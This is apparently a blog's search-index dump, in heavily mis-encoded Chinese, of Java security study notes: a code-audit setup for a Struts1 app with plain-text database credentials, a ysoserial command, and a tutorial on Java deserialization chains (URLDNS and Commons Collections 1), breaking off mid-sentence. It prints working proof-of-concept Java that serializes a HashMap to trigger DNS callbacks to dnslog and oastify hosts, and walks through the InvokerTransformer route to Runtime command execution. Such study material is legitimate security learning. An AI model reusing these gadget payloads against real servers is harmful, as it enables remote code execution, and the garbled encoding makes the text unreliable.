ä½¿ç”¨navicatè¿æ¥oracleæ•°æ®åº“æ–°å»ºè¿æ¥ï¼Œé€‰æ‹©oracleï¼Œä¸»æœºé€‰æ‹©localhostï¼Œç«¯å£é»˜è®¤ï¼ŒæœåŠ¡åæŸ¥çœ‹è®¡ç®—æœºæœåŠ¡ä¸­çš„æ˜¯ä»€ä¹ˆ ç„¶åé€‰æ‹©é«˜çº§ï¼Œè§’è‰²é€‰æ‹©sysdba è¸©å‘å¯èƒ½è¿æ¥å¤±è´¥çš„åŸå› ï¼šociç‰ˆæœ¬ä¸åŒ¹é… è§£å†³æ–¹æ³•ï¼š å»è¿™ä¸ªç½‘å€ä¸‹è½½å¯¹ç”¨ç‰ˆæœ¬çš„http://www.oracle.com/technetwork/database/features/instant-client/index-097480.html ç„¶åå»navicatä¸­çš„é€‰é¡¹ä¸­çš„ç¯å¢ƒä¸­æ›´æ”¹æˆè¿™ä¸ªä¸‹è½½çš„oci.dll è¯¦ç»†å‚è€ƒï¼šhttps://www.cnblogs.com/lrc123/p/15816179.html å¯¼å…¥æ•°æ®åº“æ•°æ®åˆ›å»ºç”¨æˆ·ï¼šzfsoft_zfim_newå¯†ç ï¼š123456 ç›´æ¥ä½¿ç”¨æ•°æ®æ³µå¯¼å…¥ä¼šæŠ¥é”™ï¼Œæ‰€ä»¥éœ€è¦ä½¿ç”¨impå¯¼å…¥ æ ¼å¼ 123imp ç”¨æˆ·å/å¯†ç @æœåŠ¡å file=&quot;æ–‡ä»¶è·¯å¾„åœ°å€&quot; full=y ignore=yimp sys/1234Qwer!@ODRL file=D:/environment/admin/odrl/dpdump/zfsoft_zfim_new.dmp full=y ignore=y æŒ‰ç…§æ•™ç¨‹ä¹Ÿä¸èƒ½éƒ¨ç½²ğŸ˜…ï¼Œå°±åˆ°è¿™é‡Œäº†ï¼Œç›´æ¥ä»£ç å®¡è®¡å§ ä»£ç å®¡è®¡æ‹¿åˆ°æºç åæœ‰ç‚¹ä¸çŸ¥é“ä»å“ªé‡Œä¸‹æ‰‹ï¼Œ å…ˆä½¿ç”¨vscodeæ‰“å¼€zfimæ–‡ä»¶å¤¹ï¼ŒæŸ¥çœ‹é¡¹ç›®çš„ç»“æ„ï¼Œåˆ¤æ–­æ˜¯ä»€ä¹ˆæ¶æ„çš„Javawebé¡¹ç›® åˆæ­¥åˆ¤æ–­åº”è¯¥æ˜¯SpringMvcã€tomcatã€C3P0è¿æ¥æ±  ç„¶åæœç´¢äº†ä»¥ä¸‹è¯¥æ¡†æ¶çš„é€»è¾‘ç»“æ„ è¡¨ç¤ºå±‚jspâ€”-&gt;è·³è½¬åˆ°è¡¨ç¤ºå±‚çš„æ§åˆ¶å™¨Servletâ€”â€“&gt;è°ƒç”¨ä¸šåŠ¡é€»è¾‘å±‚serviceâ€”â€“&gt;è°ƒç”¨æŒä¹…å±‚(DAOå±‚) å‘ç°æ•°æ®åº“çš„é…ç½®ä¿¡æ¯zfim&#x2F;WEB-INF&#x2F;lib&#x2F;zfcommon.jar 123public static final String userName = &quot;zfoa&quot;; public static final String password = &quot;123&quot;; æŸ¥çœ‹web.xmlè¿™ä¸ªæ–‡ä»¶ä½äºWEB-INF/web.xmlï¼Œå‚¨å­˜äº†æ‰€æœ‰çš„servletä¿¡æ¯ï¼Œå±äºå¼€å±€å¿…çœ‹çš„æ–‡ä»¶ å‘ç°äº†åå«actionçš„servletï¼Œè¿™ä¸ªæ˜¯strustsé‡Œé¢çš„ä¸€ä¸ªåº”ç”¨ï¼Œä¸»è¦è´Ÿè´£å°†HTTPçš„å®¢æˆ·ç«¯è¯·æ±‚ä¿¡æ¯ç»„è£…åï¼Œæ ¹æ®é…ç½®æ–‡ä»¶çš„åˆ¶å®šæè¿°ï¼Œè½¬å‘åˆ°é€‚å½“çš„å¤„ç†å™¨ ä¹Ÿå°±æ˜¯è·¯ç”±ä¿¡æ¯åœ¨è¿™äº›xmlé…ç½®æ–‡ä»¶ä¸­ struts-config.xmlé‡Œé¢æœ‰ç€å¤§é‡çš„è·¯ç”±ä¿¡æ¯ï¼Œçœ‹è¿™ä¸ªå¯ä»¥å¿«é€Ÿåœ°å®šä½å„ä¸ªåŠŸèƒ½çš„ä»£ç æ–‡ä»¶ ç»è¿‡ä¸€æ®µæ—¶é—´çš„å­¦ä¹ å¯ä»¥ç¡®è®¤è¿™ä¸ªæ˜¯struts1æ¡†æ¶æ­å»ºçš„é¡¹ç›®","categories":[{"name":"javaå®‰å…¨","slug":"javaå®‰å…¨","permalink":"http://example.com/categories/java%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"ä»£ç å®¡è®¡/java/å®æˆ˜","slug":"ä»£ç å®¡è®¡-java-å®æˆ˜","permalink":"http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-java-%E5%AE%9E%E6%88%98/"}]},{"title":"ysoserialçš„ä½¿ç”¨æ–¹æ³•","slug":"ysoserialçš„ä½¿ç”¨æ–¹æ³•","date":"2024-03-19T00:34:00.000Z","updated":"2024-10-30T14:08:09.722Z","comments":true,"path":"2024/03/19/ysoserialçš„ä½¿ç”¨æ–¹æ³•/","permalink":"http://example.com/2024/03/19/ysoserial%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/","excerpt":"","text":"âœå†…å®¹é¡¹ç›®åœ°å€ï¼šhttps://github.com/frohoff/ysoserial 1java -jar .\\ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS https://www.baidu.com &gt; 2.ser","categories":[{"name":"javaå®‰å…¨","slug":"javaå®‰å…¨","permalink":"http://example.com/categories/java%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"ä»£ç å®¡è®¡/java/ç¬”è®°/ååºåˆ—åŒ–","slug":"ä»£ç å®¡è®¡-java-ç¬”è®°-ååºåˆ—åŒ–","permalink":"http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-java-%E7%AC%94%E8%AE%B0-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]},{"title":"Javaååºåˆ—åŒ–æ¼æ´å…¥é—¨","slug":"Javaååºåˆ—åŒ–æ¼æ´å…¥é—¨","date":"2023-10-24T00:44:56.000Z","updated":"2024-10-30T14:06:58.560Z","comments":true,"path":"2023/10/24/Javaååºåˆ—åŒ–æ¼æ´å…¥é—¨/","permalink":"http://example.com/2023/10/24/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%85%A5%E9%97%A8/","excerpt":"","text":"âœå†…å®¹å‚è€ƒé“¾æ¥javaå®‰å…¨åŸºç¡€ååºåˆ—åŒ–02 URLDNSåˆ©ç”¨é“¾_å“”å“©å“”å“©_bilibili æµ…æ˜¾æ˜“æ‡‚çš„JAVAååºåˆ—åŒ–å…¥é—¨ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com) æ·±å…¥ç†è§£ Java ååºåˆ—åŒ–æ¼æ´-è…¾è®¯äº‘å¼€å‘è€…ç¤¾åŒº-è…¾è®¯äº‘ (tencent.com) Javaååºåˆ—åŒ–æ¼æ´åˆ†æ - ssooking - åšå®¢å›­ (cnblogs.com) ã€ä¸¤ä¸‡å­—åŸåˆ›é•¿æ–‡ã€‘å®Œå…¨é›¶åŸºç¡€å…¥é—¨Fastjsonç³»åˆ—æ¼æ´ï¼ˆåŸºç¡€ç¯‡ï¼‰ (qq.com) IDEAå¸¸ç”¨å¿«æ·é”®F7æ­¥å…¥|F8æ­¥è¿‡|F9åˆ°ä¸‹ä¸€ä¸ªæ–­ç‚¹|ALT+F8è¯„ä¼°è¡¨è¾¾å¼|Ctrl+F æ–‡ä»¶å†…æŸ¥æ‰¾å­—ç¬¦ä¸²|åŒå‡»Shift æŸ¥æ‰¾ä»»ä½•å†…å®¹ï¼Œå¯æœç´¢ç±»ã€èµ„æºã€é…ç½®é¡¹ã€æ–¹æ³•ç­‰ï¼Œè¿˜èƒ½æœç´¢è·¯å¾„|Ctrl + N æŒ‰ç±»åæœç´¢ç±»|Ctrl + F12 æŸ¥çœ‹å½“å‰ç±»ç»“æ„|Ctrl + H æŸ¥çœ‹ç±»çš„å±‚æ¬¡å…³ç³»|Alt + F7 æŸ¥æ‰¾ç±»æˆ–æ–¹æ³•åœ¨å“ªè¢«ä½¿ç”¨ ååºåˆ—åŒ–åŸºç¡€å‚è€ƒ:åºåˆ—åŒ–å’Œååºåˆ—åŒ– URLDNSé“¾åˆ†æè¿™æ˜¯javaçš„åŸç”Ÿåˆ©ç”¨é“¾ï¼Œé€šå¸¸ç”¨äºååºåˆ—åŒ–çš„éªŒè¯ï¼Œå› ä¸ºæ˜¯åŸç”Ÿæ€ä¸å­˜åœ¨ç‰ˆæœ¬é™åˆ¶ HashMapç»“åˆURLè§¦å‘çš„DNSæ£€æŸ¥æ€è·¯ åˆ©ç”¨é“¾123456789HashMap --&gt; readObject()HashMap --&gt; hash()URL --&gt; hashcode()URL --&gt; getByName()è¿›è¡ŒåŸŸåè§£æçš„å‡½æ•° åˆ©ç”¨åˆ†æ é¦–å…ˆæ–°å»ºä¸€ä¸ªDnsTesterç±»ï¼Œnewä¸€ä¸ªHashMapå¯¹è±¡å’Œä¸€ä¸ªURLå¯¹è±¡ 123456789101112import java.net.MalformedURLException; import java.net.URL; import java.util.HashMap; public class DnsTester &#123; public static void main(String[] args) throws MalformedURLException &#123; HashMap list = new HashMap&lt;&gt;();//æ–°å»ºHashMapå¯¹è±¡ URL host = new URL(&quot;http://yp1vwv.dnslog.cn&quot;); list.put(host,&quot;22&quot;); &#125; &#125; ç„¶åæŒ‰ä½ctrlé”®ï¼Œå·¦é”®ç‚¹å‡»HashMapè¿›å…¥æŸ¥çœ‹ ç‚¹å‡»æŸ¥çœ‹ç»“æ„çª—å£ï¼Œç„¶åæ‰¾åˆ°readObjectæ–¹æ³•ï¼Œæ‰¾åˆ°ä¸‹é¢æœ‰ä¸€ä¸ªhashæ–¹æ³•åŠ å¯†key è½¬åˆ°hashæ–¹æ³• å¯ä»¥çœ‹åˆ°ä¼ å…¥hashæ–¹æ³•ä¸­çš„æ˜¯å¯¹è±¡ï¼Œç„¶åä½¿ç”¨å¯¹è±¡çš„hashCodeæ–¹æ³•æ¥è¿›è¡ŒåŠ å¯† è¿™æ¡åˆ©ç”¨é“¾ç”¨åˆ°çš„æ˜¯URLç±»çš„hashCodeæ–¹æ³• è½¬åˆ°DnsTesterç±»ï¼Œç„¶åctrl+å·¦é”®è½¬åˆ°URLç±»ä¸­ æ‰¾åˆ°hashCodeæ–¹æ³•ï¼Œå¯ä»¥çœ‹åˆ°å…ˆæ˜¯åˆ¤æ–­hashCodeçš„å€¼æ˜¯ä¸æ˜¯-1ï¼Œæ˜¯çš„è¯å°±ç›´æ¥é€€å‡ºï¼Œä¸æ˜¯çš„è¯å°±ç»§ç»­æ‰§è¡Œä¸‹é¢çš„ä»£ç  æŸ¥çœ‹handlerç±»ä¸­hashCodeæ–¹æ³•ï¼Œctrl+å·¦é”®ç‚¹å‡»handler.hashCode() è¿™æ—¶å€™ä¼ å…¥çš„æ˜¯uï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¸€å¼€å§‹å®šä¹‰çš„URLå¯¹è±¡ å¯ä»¥çœ‹åˆ°è°ƒç”¨äº†URLå¯¹è±¡çš„getHostAddressæ–¹æ³• è½¬åˆ°getHostAddressæ–¹æ³• å‘ç°è°ƒç”¨äº†InetAddressçš„getByNameæ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•çš„ä½œç”¨æ˜¯é€šè¿‡DNSè§£æhostçš„IPåœ°å€ï¼Œåˆ©ç”¨é“¾åˆ°è¿™é‡Œå°±ç»“æŸäº† attentionä½†æ˜¯æˆ‘ä»¬éœ€è¦çš„æ˜¯éœ€è¦å°†HashMapå¯¹è±¡ç»™åºåˆ—åŒ–çš„ï¼Œè¿™æ ·çš„è¯æˆ‘ä»¬åœ¨ååºåˆ—åŒ–å‰å°±ä¼šä½¿ç”¨ä¸€æ¬¡DNSè§£æï¼Œè€Œè¿™æ—¶å€™æˆ‘ä»¬çš„æœ¬åœ°å°±ä¼šæœ‰DNSè®°å½•ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å°†åºåˆ—åŒ–çš„å†…å®¹ååºåˆ—åŒ–çš„æ—¶å€™å°±ä¸ä¼šåœ¨dnslogå¹³å°äº§ç”Ÿè¯·æ±‚è®°å½•äº† è§£å†³æ–¹æ³•ï¼šå…¶å®è¿™ä¸ªå¯¹è¿œç¨‹çš„ç›®æ ‡æœ‰ä»€ä¹ˆå½±å“ï¼Œåªæ˜¯ä¼šå½±å“æœ¬åœ°çš„å¤ç°è€Œå·²ï¼Œè€Œä¸”ä½¿ç”¨æ–°ç‰ˆæœ¬çš„burpsuiteçš„collabratorä¹Ÿæ²¡ä»€ä¹ˆå½±å“ è§£å†³æ–¹å¼ä¸€ï¼šåˆ·æ–°æœ¬åœ°dnsè®°å½• ipconfig /flushdns è§£å†³æ–¹æ³•äºŒï¼šä½¿ç”¨åå°„ä¿®æ”¹hashCodeçš„å€¼ æŒ‰ç…§æ€è·¯ï¼Œåªè¦åœ¨putæ–¹æ³•ä¹‹å‰å°†URLå¯¹è±¡ä¼ å…¥ä¹‹å‰ä½¿ç”¨åå°„çš„æ–¹æ³•å°†hashCodeçš„å€¼ä¿®æ”¹æˆé-1å³å¯ï¼Œä»£ç å®ç°å¦‚ä¸‹ï¼š 12345678910111213141516171819202122232425262728import java.io.*; import java.lang.reflect.Field; import java.net.MalformedURLException; import java.net.URL; import java.util.HashMap; public class DnsTester &#123; public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123; HashMap list = new HashMap&lt;&gt;(); URL host = new URL(&quot;http://fyhgocmxl650362zx0g1cw4t5kbbz1nq.oastify.com&quot;); //æ·»åŠ åå°„ï¼Œè·å–URLç±»ä¸­çš„HashCodeæ–¹æ³• Class c = Class.forName(&quot;java.net.URL&quot;); Field FieldhashCode = c.getDeclaredField(&quot;hashCode&quot;); FieldhashCode.setAccessible(true);// å˜é‡ä¸º private ä¿®æ”¹è®¿é—®æƒé™ FieldhashCode.set(host,1);//è¿™é‡Œä¼ å…¥çš„æ˜¯å…·ä½“çš„URLå¯¹è±¡å’Œæƒ³è¦è®¾ç½®çš„å€¼ï¼Œåªè¦ä¸æ˜¯-1å°±è¡Œ list.put(host,&quot;22&quot;);//å› ä¸ºè¿™æ—¶å€™hashCodeä¸æ˜¯-1ï¼Œæ‰€ä»¥è¿™æ—¶å€™å°±ä¸ä¼šå‘ç”Ÿdnsè¯·æ±‚äº† FieldhashCode.set(host,-1);//å°†å€¼æ”¹è¿‡æ¥ //å°†HashMapå¯¹è±¡liståºåˆ—åŒ–å†™å…¥æ–‡ä»¶ FileOutputStream fileOutputStream = new FileOutputStream(&quot;./ser.txt&quot;); ObjectOutputStream serial = new ObjectOutputStream(fileOutputStream); serial.writeObject(list); serial.close(); fileOutputStream.close(); &#125; &#125; é‡æ–°æ–°å»ºä¸€ä¸ªjavaç±»æ–‡ä»¶å†™å…¥ååºåˆ—åŒ–ä»£ç ï¼Œååºåˆ—åŒ–ä»£ç å¦‚ä¸‹ï¼š 123456789101112131415import java.io.FileInputStream; import java.io.FileNotFoundException; import java.io.IOException; import java.io.ObjectInputStream; public class DeSerial &#123; public static void main(String[] args) throws IOException, ClassNotFoundException &#123; FileInputStream fileInputStream = new FileInputStream(&quot;./ser.txt&quot;); ObjectInputStream deserial = new ObjectInputStream(fileInputStream); deserial.readObject(); deserial.close(); fileInputStream.close(); &#125; &#125; å…ˆè¿è¡Œåºåˆ—åŒ–çš„ä»£ç ï¼Œç„¶åè¿è¡Œååºåˆ—åŒ–ä»£ç  å¦‚ä¸Šå›¾è¿è¡ŒæˆåŠŸ æ³¨æ„ï¼šå¯¹äºjava21æ¥è¯´ä¸å…è®¸é€šè¿‡åå°„ä¿®æ”¹privateï¼Œä½†æ˜¯java8æ²¡é—®é¢˜ è§£å†³æ–¹æ³•ï¼šä½¿ç”¨ysoserialä¸­çš„åˆ©ç”¨æ–¹å¼ å‚è€ƒï¼šhttps://paper.seebug.org/1242/#_2https://www.yuque.com/tianxiadamutou/zcfd4v/fewu54#44f36f80 ysoåœ¨åˆ›å»ºURLå¯¹è±¡æ—¶ä½¿ç”¨äº†ä¸‰ä¸ªå‚æ•°çš„æ„é€ æ–¹æ³•ã€‚è¿™é‡Œæ¯”è¾ƒæœ‰æ„æ€çš„æ˜¯ï¼Œysoç”¨äº†å­ç±»ç»§æ‰¿çˆ¶ç±»çš„æ–¹å¼è§„é¿äº†dnsæŸ¥è¯¢çš„é£é™©ï¼Œå…¶åˆ›å»ºäº†ä¸€ä¸ªå†…éƒ¨ç±»ï¼š 12345678910static class SilentURLStreamHandler extends URLStreamHandler &#123; protected URLConnection openConnection(URL u) throws IOException &#123; return null; &#125; protected synchronized InetAddress getHostAddress(URL u) &#123; return null; &#125; &#125; å®šä¹‰äº†ä¸€ä¸ªURLConnectionå’ŒgetHostAddressæ–¹æ³•ï¼Œå½“è°ƒç”¨putæ–¹æ³•èµ°åˆ°getHostAddressæ–¹æ³•åï¼Œä¼šè°ƒç”¨SilentURLStreamHandlerçš„getHostAddressè€ŒéURLStreamHandlerçš„getHostAddressï¼Œè¿™é‡Œç›´æ¥return nulläº†ï¼Œæ‰€ä»¥è‡ªç„¶ä¹Ÿå°±ä¸ä¼šäº§ç”ŸdnsæŸ¥è¯¢ã€‚ é‚£ä¹ˆä¸ºä»€ä¹ˆåœ¨ååºåˆ—åŒ–æ—¶åˆå¯ä»¥äº§ç”ŸdnsæŸ¥è¯¢äº†å‘¢ï¼Ÿæ˜¯å› ä¸ºè¿™é‡Œçš„handlerå±æ€§è¢«è®¾ç½®ä¸ºtransientï¼Œå‰é¢è¯´äº†è¢«transientä¿®é¥°çš„å˜é‡æ— æ³•è¢«åºåˆ—åŒ–ï¼Œæ‰€ä»¥æœ€ç»ˆååºåˆ—åŒ–è¯»å–å‡ºæ¥çš„transientä¾æ—§æ˜¯å…¶åˆå§‹å€¼ï¼Œä¹Ÿå°±æ˜¯URLStreamHandlerã€‚ æ€»ç»“ æ€»ç»“ä¸€ä¸‹å¯»æ‰¾æ¼æ´çš„æµç¨‹ï¼š1ã€hashmapç±»ä¸­çš„ååºåˆ—åŒ–æ–¹æ³•readObjectæ–¹æ³•ä¸­è°ƒç”¨äº†hashæ–¹æ³•2ã€hashæ–¹æ³•è°ƒç”¨äº†ä¼ å…¥çš„é”®å€¼keyå¯¹è±¡çš„hashcodeæ–¹æ³•ï¼Œå› ä¸ºè¿™ä¸ªå¯¹è±¡æ˜¯Objectç±»å‹ï¼Œæ‰€ä»¥ä¼ å…¥æœ‰hashcodeæ–¹æ³•çš„å¯¹è±¡å³å¯3ã€é¼ æ ‡åœåœ¨hashcodeæ–¹æ³•ä¸Šï¼ŒæŒ‰å¿«æ·é”®ctrl+alt+F7ï¼Œæ‰“å¼€å³ä¸Šè§’çš„è®¾ç½®ï¼Œé€‰æ‹©æ‰¾é‡å†™æ–¹æ³•ï¼Œé€‰æ‹©æŸ¥æ‰¾èŒƒå›´ä¸ºåº“ï¼Œç„¶åæŒ‰alt+F7è¿›è¡ŒæŸ¥æ‰¾ï¼Œæœ€åæ‰¾åˆ°java.net.URLä¸­æœ‰ç”¨åˆ°hashcode4ã€æ‰¾åˆ°hashcodeæ–¹æ³•æ˜¯ä½¿ç”¨çš„handlerå¯¹è±¡çš„hashcodeæ–¹æ³•ï¼Œhandlerå¯¹è±¡æ˜¯URLStreamHandlerç±»çš„å¯¹è±¡5ã€è½¬åˆ°URLStreamHandlerç±»ä¸­hashCodeæ–¹æ³•ï¼Œå‘ç°é‡Œé¢ä½¿ç”¨äº†getHostAddressæ–¹æ³•6ã€è½¬åˆ°getHostAddressæ–¹æ³•ï¼Œå‘ç°æ–¹æ³•u.getHostAddress()ï¼Œuæ˜¯URLå¯¹è±¡ï¼Œåˆè¿”å›åˆ°URLç±»ä¸­çš„getHostAddress()æ–¹æ³•7ã€è½¬åˆ°URLç±»ä¸­çš„getHostAddress()æ–¹æ³•ï¼Œå‘ç°InetAddress.getByName(host)8ã€ä¸Šä¸€æ­¥getByNameæ–¹æ³•å°±æ˜¯åšdnsè§£æ æµç¨‹å›¾ 123456hashmap(readObject)-&gt;hashmap(readObject--&gt;&gt;hash)-&gt;hashmap(hash--&gt;&gt;[obj]hashcode)-&gt;URL(hashcode--&gt;&gt;URLStreamHandler.hashcode)-&gt;URLStreamHandler(hashcode--&gt;&gt;[InetAddress]getHostAddress)-&gt;URLStreamHandler(getHostAddress--&gt;&gt;[URL]u.getHostAddress())-&gt;URL(InetAddress.getByName) POCæ„é€ æ€è·¯ç›®çš„æ˜¯è®©hashmapååºåˆ—åŒ–çš„æ—¶å€™å°†keyçš„å¯¹è±¡æ‰§è¡Œhashcodeæ–¹æ³•ï¼Œè€Œä¸”æ‰§è¡Œçš„è¿˜è¦æ˜¯URLç±»ä¸­çš„æ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¼ å…¥ä¸€ä¸ªURLç±»å‹çš„é”®åˆ°hashmapå¯¹è±¡ 123HashMap list = new HashMap&lt;&gt;();//æ–°å»ºHashMapå¯¹è±¡URL host = new URL(&quot;http://yp1vwv.dnslog.cn&quot;); list.put(host,&quot;22&quot;); Common Collectionsåˆ©ç”¨é“¾åˆ†æApache Commons Collections æ˜¯ä¸€ä¸ªæ‰©å±•äº†Javaæ ‡å‡†åº“é‡Œçš„Collectionç»“æ„çš„ç¬¬ä¸‰æ–¹åŸºç¡€åº“ 123é¡¹ç›®åœ°å€å®˜ç½‘ï¼š http://commons.apache.org/proper/commons-collections/ Github: https://github.com/apache/commons-collections javaæºç ç¯å¢ƒæ­å»ºå› ä¸ºåœ¨sunåŒ…ä¸­çš„éƒ½æ˜¯classæ–‡ä»¶ä¸æ˜¯javaæºç ï¼Œåœ¨æŸ¥æ‰¾æŸä¸ªå‡½æ•°çš„ç”¨æ³•çš„æ—¶å€™åªä¼šåœ¨æºç ä¸­æ‰¾ï¼Œæ‰€ä»¥éœ€è¦ä¸‹è½½sunåŒ…ä¸­çš„æºç  ä¸‹è½½åœ°å€ï¼šhttps://hg.openjdk.org/ æ ¹æ®ç½‘ä¸Šæ‰€è¯´çš„ï¼Œåœ¨jdk8u65ä»¥åå°±ä¿®å¤äº†AnnotationInvocationHandlerç±»çš„ç›¸å…³æ¼æ´ï¼Œæ‰€ä»¥æœ€å¥½ä¸‹è½½jdk8u65ä»¥å‰çš„æºç jdk8u65æºç è·¯å¾„ï¼šhttps://hg.openjdk.org/jdk8u/jdk8u/jdk/archive/af660750b2f4.zip ä¸‹è½½å¯¹åº”çš„ç‰ˆæœ¬çš„JDKï¼Œä¹Ÿå°±æ˜¯JDK8u65 java8å†å²ç‰ˆæœ¬ä¸‹è½½Java å­˜æ¡£ä¸‹è½½ â€” Java SE 8 | Oracle ä¸­å›½ é€‰æ‹©JDK8u65çš„JDKç‰ˆæœ¬ï¼Œç„¶åå®‰è£…é…ç½®é¡¹ç›®JDKå³å¯ å°†åˆšåˆšä¸‹è½½çš„jdk8u65æºç è§£å‹ï¼Œç„¶åå°†src\\share\\classesä¸­çš„sunæ–‡ä»¶å¤¹å¤åˆ¶åˆ°jdk8u65å®‰è£…ç›®å½•ä¸‹çš„src.zipä¸­ ç„¶åé…ç½®ä¸€ä¸‹IDEAä¸­çš„é¡¹ç›®ç»“æ„ä¸­JDKä¸º8u65å³å¯ ç„¶åæ‰¾åˆ°AnnotationInvocationHandlerç±» å‡ºç°é—®é¢˜äº†ï¼Œå¯èƒ½æ˜¯æºç æˆ–è€…JDKä¸‹é”™äº†ï¼ŒæŒ‰ç…§è¿™ä¸ªæ€è·¯æ²¡æœ‰é”™ï¼Œä½†æ˜¯æºç å•¥çš„ä¸€å®šè¦å¯¹åº”ï¼Œå¦åˆ™å°±ä¼šæœ‰è¿™ä¸ªé—®é¢˜ æœ€åå°è¯•äº†åŠå¤©ä½¿ç”¨äº†java7u80ç‰ˆæœ¬ï¼Œæºç å¯¹åº”ä½ç½®ï¼šhttps://hg.openjdk.org/jdk7u/jdk7u/jdk/rev/a942e0b52477 Common Collections1 å‚è€ƒ:Javaååºåˆ—åŒ–CommonsCollectionsç¯‡(ä¸€) CC1é“¾æ‰‹å†™EXP_å“”å“©å“”å“©_bilibilihttps://paper.seebug.org/1242/#_3 åˆ©ç”¨é“¾ ç¬¬ä¸€éƒ¨åˆ†ï¼šæ„é€ Runtimeæ‰§è¡Œå‘½ä»¤ï¼Œå¹¶ä¸”è§£å†³Runtimeåºåˆ—åŒ–é—®é¢˜ public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) public ConstantTransformer(Object constantToReturn) public ChainedTransformer(Transformer[] transformers) ç¬¬äºŒéƒ¨åˆ†ï¼šæ‰©å¤§åˆ©ç”¨é“¾ protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) valueTransformer.transform() ç¬¬ä¸‰éƒ¨åˆ†ï¼šååºåˆ—åŒ–åˆ©ç”¨ AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; type, Map&lt;String, Object&gt; memberValues) readObject()â€“&gt;&gt;setValue() setValue()â€“&gt;&gt;å›åˆ°äº†TransformedMapçš„çˆ¶ç±»AbstractInputCheckedMapDecorator éš¾ç‚¹å°±æ˜¯çˆ¶ç±»é‡å†™äº†setvalueæ–¹æ³•ï¼Œè¿™ä¸€æ­¥å›åˆ°äº†çˆ¶ç±» ç„¶åè°ƒç”¨valueTransformer.transform(object); è¯¦ç»†è§ä¸‹é¢åˆ†æ ç¯å¢ƒæ­å»ºå› ä¸ºä¸æ˜¯è‡ªå¸¦çš„åŒ…ï¼Œæ‰€ä»¥éœ€è¦å¯¼å…¥åŒ…åˆ°é¡¹ç›®æˆ–è€…æ¨¡å—ä¸­æ‰å¯ä»¥ä½¿ç”¨ è¿™é‡Œä½¿ç”¨mavenå¯¼å…¥æ¯”è¾ƒç®€å•å“¦ ç›´æ¥æ–°å»ºæ¨¡å—ï¼Œé€‰æ‹©mavenç„¶ååœ¨pom.xmlæ–‡ä»¶ä¸­æ·»åŠ ç‰ˆæœ¬3.1çš„commons-collections 1234567&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;commons-collections&lt;/groupId&gt; &lt;artifactId&gt;commons-collections&lt;/artifactId&gt; &lt;version&gt;3.1&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; ç„¶åå³é”®ï¼Œé€‰æ‹©mavenä¸­çš„ä¸‹è½½æºä»£ç å³å¯ä¸‹è½½javaæºä»£ç  å¦‚æ­¤ï¼Œç¯å¢ƒä¾¿æ˜¯å·²ç»æ­å»ºå®Œæ¯• åˆ©ç”¨é“¾åˆ†æåœ¨commons collectionsä¸­æœ‰ä¸€ä¸ªTransformeræ¥å£ï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ªtransformæ–¹æ³•ï¼Œé€šè¿‡å®ç°æ­¤æ¥å£æ¥è¾¾åˆ°ç±»å‹è½¬æ¢çš„ç›®çš„ã€‚æˆ‘ä»¬çœ‹ä¸€ä¸‹æœ‰å“ªäº›ç±»å®ç°äº†è¿™ä¸ªæ¥å£ï¼Œç›´æ¥é¼ æ ‡åœç•™åœ¨Transformeræ¥å£çš„transformeræ–¹æ³•ä¸Šï¼Œç„¶åæŒ‰ä½ctrl+alt+Bï¼Œå°±å¯ä»¥çœ‹åˆ°æ‰€æœ‰å®ç°äº† å…¶ä¸­æœ‰ä¼—å¤šç±»å®ç°äº†æ­¤æ¥å£ï¼Œccä¸­ä¸»è¦åˆ©ç”¨åˆ°äº†ä»¥ä¸‹ä¸‰ä¸ªã€‚ InvokerTransformeråŒ…è·¯å¾„å¦‚ä¸‹ï¼šorg.apache.commons.collections.functors.InvokerTransformer 1234567891011121314151617public Object transform(Object input) &#123; if (input == null) &#123; return null; &#125; try &#123; Class cls = input.getClass(); Method method = cls.getMethod(iMethodName, iParamTypes); return method.invoke(input, iArgs); &#125; catch (NoSuchMethodException ex) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; does not exist&quot;); &#125; catch (IllegalAccessException ex) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; cannot be accessed&quot;); &#125; catch (InvocationTargetException ex) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; threw an exception&quot;, ex); &#125; &#125; è¿™ä¸ªç±»ä¸­çš„æ–¹æ³•ä½œç”¨æ˜¯ä¼ å…¥ä¸€ä¸ªç±»ï¼Œç„¶ååˆ©ç”¨åå°„è°ƒå–è¿™ä¸ªé‡Œé¢çš„æ–¹æ³• å…¶å®æœ€ä¸»è¦çš„æ¼æ´å°±æ˜¯è¿™é‡Œäº†ï¼Œåªè¦æˆ‘ä»¬åˆ›å»ºInvokerTransformerå¯¹è±¡ï¼Œç„¶ååˆå§‹åŒ–çš„æ—¶å€™å°†æˆ‘ä»¬çš„execå‡½æ•°å’Œæƒ³è¦æ‰§è¡Œçš„å‘½ä»¤ä¼ è¿›å»ï¼Œç„¶ååˆ©ç”¨InvokerTransformerå¯¹è±¡çš„transformæ–¹æ³•å°†æˆ‘ä»¬çš„Runtimeå¯¹è±¡ä¼ 